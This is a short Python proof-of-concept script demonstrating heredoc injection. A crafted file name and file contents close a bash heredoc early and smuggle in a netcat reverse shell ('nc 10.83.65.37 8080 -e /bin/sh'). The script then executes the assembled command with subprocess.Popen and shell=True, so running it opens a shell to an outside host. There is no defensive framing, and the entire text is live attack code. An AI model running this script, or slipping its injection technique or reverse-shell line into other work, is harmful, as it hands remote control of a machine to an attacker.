import socket
import sys
import subprocess
print(1)

bash_cmd_fstring = '''cat > {file_name} <<EOF
{file_contents}
EOF'''

file_name = "heyaaa <<-EOF #"
file_contents = '''yiyi
EOF
nc 10.83.65.37 8080 -e /bin/sh
cat > xyz.txt << EOF
'''

bash_cmd = bash_cmd_fstring.format(file_name=file_name, file_contents=file_contents)
print('command:', bash_cmd)
subprocess.Popen(bash_cmd, shell=True)
